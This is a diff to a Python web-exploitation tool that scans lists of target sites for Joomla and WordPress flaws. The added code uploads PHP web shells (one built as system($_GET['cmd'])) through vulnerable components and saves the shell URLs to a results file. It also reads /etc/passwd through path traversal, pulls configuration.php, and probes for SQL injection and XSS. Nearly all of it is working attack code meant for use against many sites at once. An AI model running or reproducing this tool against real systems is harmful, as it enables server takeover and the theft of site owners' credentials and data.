@@ -238,6 +238,19 @@ def autoadmin(url):
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}autoadmin {PURPLE}=> {RED}Not Vuln")
 
+def com_portfolio(url):
+    PostFile = {'Filedata': open('shell/hateme.php', 'rb')
+    }
+    requests.post(url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', files=PostFile, timeout=timeout, headers=HEADERS)
+    test = requests.get(url+'/administrator/components/com_bt_portfolio/hateme.php', timeout=timeout, headers=HEADERS)
+    if "Vulnnr on yo forehead" in test.text:
+        filename = "Results/shells.txt"
+        with open(filename, "a+") as f:
+            f.write(url + '/administrator/components/com_bt_portfolio/hateme.php?cmd=uname -a' + '\n')
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_portfolio {PURPLE}=> {GREEN}Vuln {RESET}shell saved to {GREEN}{filename}")
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_portfolio {PURPLE}=> {RED}Not vuln")
+
 
 def Spreedsheet(url):
     test = requests.get(url+"/wp-content/plugins/wpSS/ss_load.php", timeout=timeout)
@@ -418,7 +431,7 @@ def wp_cherry(url):
         requests.post(endpoint, data=options,headers=HEADERS,verify=False)
         dump_data = url + "/wp-content/plugins/cherry-plugin/admin/import-export/hateme.php?cmd=ls"
         content = requests.get(dump_data,headers=HEADERS,verify=False).text
-        check_cherry = re.findall("hateme", content)
+        check_cherry = re.findall("Vulnnr on yo forehead", content)
         if check_cherry:
             print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Cherry Upload {PURPLE}=>{RESET} {GREEN}Vuln")
             filename = "Results/shells.txt"
@@ -529,6 +542,27 @@ def wp_version(url):
         return print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sWordpress Version :%s %s' % (RESET, GREEN, version) + f"{RESET}")
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Version: {RED}No Version{RESET}")
+
+def phpver(url):
+    
+    getvs = requests.get(url, timeout=timeout, headers=HEADERS).headers
+    if "X-Powered-By" in getvs:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}PHPVERSION {PURPLE}=> {GREEN}" + getvs['X-Powered-By'])
+    if "Server" in getvs:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Server {PURPLE}=> {GREEN}" + getvs['Server'])
+    if getvs['Server'] == "cloudflare":
+        u = requests.get(url+"/mailman/listinfo/mailman")
+        if u.status_code == 200:
+            output = subprocess.getoutput("curl "+url+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]
+            print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}{output.replace('/mailman/listinfo/mailman', '')}")
+
+        #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}" + getvs['Server'])
+    #if "Set-Cookie" in getvs:
+        #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Cookie {PURPLE}=> {GREEN}" + getvs['Set-Cookie'])
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Serverinfo {PURPLE}=> {RED}Not Found")
+
+
 
 
 def wp_dirs(url):
@@ -721,6 +755,33 @@ def serialize(url):
         return result
 
 
+def parms(site):
+    ## LIL PRAM SPIDER
+
+
+    GetLink = requests.get(site, timeout=10, headers=HEADERS)
+    urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
+    if len(urls) != 0:
+        #print(urls)
+        prams = []
+        for url in urls:
+            if "?" in str(url):
+                prams.append(site + '/' + url)
+                
+                for url in prams:
+                    if "///" in urls:
+                        pass
+                    #print(url.replace('///', '/'))
+                    filename = "Results/PramSpider.txt"
+                    with open(filename, "a+") as f:
+                        f.write(f"{url.replace('///', '/')}\n")
+                        #f.write(test.text)
+                    f.close()
+        return print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}PramSpider {PURPLE}=> {GREEN}collected results and saved to {filename}")
+        
+                
+
+
 def Exploitt(site):
     try:
         GetLink = requests.get(site, timeout=10, headers=HEADERS)
@@ -733,7 +794,7 @@ def Exploitt(site):
             
         return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not find prams to test for SQL")
     except Exception as e:
-        print(e)
+        #print(e)
         return 
 
 
@@ -805,10 +866,7 @@ def CheckSqli(MaybeSqli, site):
 
 def detect(url):
         """
-        this module to detect cms & return type of cms.
-        & make instance of cms.
-
-        I STOLE THIS FROM https://github.com/anouarbensaad/vulnx/blob/91fb3700f4fa5c00dcbfb4ab25685ce988040e36/modules/detector.py#L53 BC IDK HOW I WOULD DO IT
+        https://github.com/anouarbensaad/vulnx/blob/91fb3700f4fa5c00dcbfb4ab25685ce988040e36/modules/detector.py#L53 
 
         """
         if re.search(re.compile(r'<script type=\"text/javascript\" src=\"/media/system/js/mootools.js\"></script>|/media/system/js/|com_content|Joomla!'), __getcontent__(url)):
@@ -858,10 +916,13 @@ def auto(url):
         return main()
 
     try:
-        print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+        print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for Serverinfo {GREEN}~{RESET} {PURPLE}]{RESET}\n")
         
         cms = serialize(url)
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}]{RESET} CMS {PURPLE}=> {GREEN}", cms['name'])
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {GREEN}{url}")
+        print(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} CMS {PURPLE}=> {GREEN}", cms['name'])
+        phpver(url)
+        parms(site)
         if "Wordpress" in cms['name']:
 
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting wpscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
@@ -879,6 +940,7 @@ def auto(url):
             print("")
             Exploit(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
+            #wp_thumbnailSlider(url) Broken
             revslidercss(url)
             Spreedsheet(url)
             wp_blaze(url)
@@ -898,42 +960,119 @@ def auto(url):
             #filename = url.replace("http://", '').replace('/', '')+".txt"
             revexploit(url)
             audioplayer(url)
+            Triconsole(url)
+        elif "Joomla" in cms['name']:
+            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Joomla Scan! {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+            Scriptegrator(url)
+            com_cckjseblod(url)
+            Com_civicrm(url)
+            com_Questions(url)
+            com_portfolio(url)
+            com_jck(url)
+            Triconsole(url)
+
         else:
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
             #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
             Exploitt(site)
+            Triconsole(url)
             
     except Exception as e:
-        #print(e)
+        print(e)
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
         
-    try:
-        wp_thumbnailSlider(url)
-    except:
-        pass
+def com_cckjseblod(url):
+    test = requests.get(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php", timeout=timeout, headers=HEADERS)
+    if 'JConfig' in str(test.content):
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+        with open(filename, "a+") as f:
+            f.write(test.url+ '\n')
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_cckjseblod {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_cckjseblod {PURPLE}=> {RED}Not Vuln")
 
+def com_jck(url):
+    test = requests.get(url+"/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php", timeout=timeout)
+    if "nodes" in test.text:
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+        with open(filename, "a+") as f:
+            f.write(test.url+ '?extension=menu&view=menu&parent=[SQL_HERE]' + '\n')
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{test.url}?extension=menu&view=menu&parent=[SQL_HERE] {RESET}| {YELLOW}Info {GREEN}https://www.exploit-db.com/exploits/49627")
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_jck {PURPLE}=> {RED}Not Vuln")
+
+def Triconsole(url):
+    test = requests.get(url+'/calendar/calendar_form.php/"><h1>Vulnnr</h1>')
+    test1 = requests.get(url+'/calendar_form.php/"><h1>Vulnnr</h1>')
     
+    if "Vulnnr" in test.text:
+        if test.status_code == 200:
+            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+            with open(filename, "a+") as f:
+                f.write(test.url + '\n')
+            print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
+        
+    elif "Vulnnr" in test1.text:
+        if test1.status_code == 200:
+            print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
+            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+            with open(filename, "a+") as f:
+                f.write(test1.url + '\n')
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {RED}Not Vuln")
+def Com_civicrm(url):
+    payloadshell = '"Vulnnr<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
+    requests.post(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=vuln.php', data=payloadshell, headers=HEADERS, timeout=timeout)
+    test = requests.get(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/vuln.php', headers=HEADERS, timeout=timeout)
+    if "Vulnnr" in str(test.content):
+        filename = "Results/shells.txt"
+        with open(filename, "a+") as f:
+            f.write(url + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/vuln.php?cmd=uname -a' + '\n')
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_civicrm {PURPLE}=> {GREEN}Vuln {RESET}shell saved to {GREEN}{filename}")
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_civicrm {PURPLE}=> {RED}Not Vuln")
+
+
+def Scriptegrator(url):
+    test = requests.get(url+"/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd", headers=HEADERS, timeout=timeout)
+    if "root" in test.text:
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+        with open(filename, "a+") as f:
+            f.write(test.text+ '\n')
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} Scriptegrator {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
+    else:
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} Scriptegrator {PURPLE}=> {RED}Not Vuln")
+
+def com_Questions(url):
+    test = requests.get(url+"/index.php?option=com_questions&tmpl=component&task=quazax.getusers&term=66'", timeout=timeout)
+    if "mysql" in test.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}/index.php?option=com_questions&tmpl=component&task=quazax.getusers&term=66'")
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+        with open(filename, "a+") as f:
+            f.write(test.url+ '\n')
+    else:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_questions {PURPLE}=> {RED}Not Vuln")
 
 
 def normalerrors():
-    print(f"{RESET}i guess something went {RED}wrong{RESET}, try again? {RESET}")
+    print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RESET}something went {RED}wrong{RESET}, try again? {RESET}")
     return main()
     
 def portcheck():
-    user = input(f"Site{RED}:{RESET} ")
+    user = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Site {PURPLE}=>{RESET} ")
 
     target = user
 
     if "http" in target:
-        print("Maybe instead of calling protocalls try www.google.com")
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Maybe instead of calling protocalls try www.google.com")
         return main()
     if target == "":
-        print("Looks like value is null, enter a site!")
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Looks like value is null, enter a site!")
         return portcheck()
 
-    portu = input(f"Port{RED}:{RESET} ")
+    portu = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Port{PURPLE} =>{RESET} ")
     try:
         
         if portu == "":
@@ -997,8 +1136,8 @@ def xhelp():
     print(f"""
  {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}webvulns:\n
     {PURPLE}[ {GREEN}1 {PURPLE}] {RESET}mailman {PURPLE}=> {RESET}Cloudssp exploit
-    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}wpscan {PURPLE}=> {RESET}Wordpress Scanner/exploiter
-    {PURPLE}[ {GREEN}3 {PURPLE}] {RESET}wpauto {PURPLE}=> {RESET}Wordpress Scanner/exploiter list
+    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}vulnscan {PURPLE}=> {RESET}Vuln Scanner/exploiter single target
+    {PURPLE}[ {GREEN}3 {PURPLE}] {RESET}vulnauto {PURPLE}=> {RESET}Vuln Scanner/exploiter list
     {PURPLE}[ {GREEN}4 {PURPLE}] {RESET}wpversion {PURPLE}=> {RESET}Wordpress Version Scanner
     {PURPLE}[ {GREEN}5 {PURPLE}] {RESET}wpthemes {PURPLE}=> {RESET}Wordpress Theme Scanner
     {PURPLE}[ {GREEN}6 {PURPLE}] {RESET}wpplugins {PURPLE}=> {RESET}Wordpress Plugins Scanner
@@ -1049,8 +1188,8 @@ def main():
         wp_themes(url)
         return main()
 
-    elif userinput == "wpauto":
-        print(f" \n {PURPLE}[ {GREEN}${PURPLE} ] {RESET}Wordpress Scanner/Exploiter")
+    elif userinput == "vulnauto":
+        print(f" \n {PURPLE}[ {GREEN}${PURPLE} ] {RESET}Vuln Scanner/Exploiter")
         file_name = input(f" \n {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Targets {PURPLE}=>{RESET} ")
         try:
             
@@ -1061,14 +1200,14 @@ def main():
                 urls = [x[:-1] for x in buf]
                 for url in urls:
                     auto(url)
-                    print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Done!\n")
+                    print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Done!")
         except Exception as e:
             print(e)
             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not open {RED}{file_name}!\n")
             return main()
         
-    elif userinput == "wpscan":
-        print(f"\n {PURPLE}[ {GREEN}~ {RESET}Wordpress Scanner/exploiter  {GREEN}~ {PURPLE}] {RESET}\n")
+    elif userinput == "vulnscan":
+        print(f"\n {PURPLE}[ {GREEN}~ {RESET}Vuln Scanner/exploiter  {GREEN}~ {PURPLE}] {RESET}\n")
         url = input(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Target{PURPLE} => {RESET}")
         init_time = time.time()
         
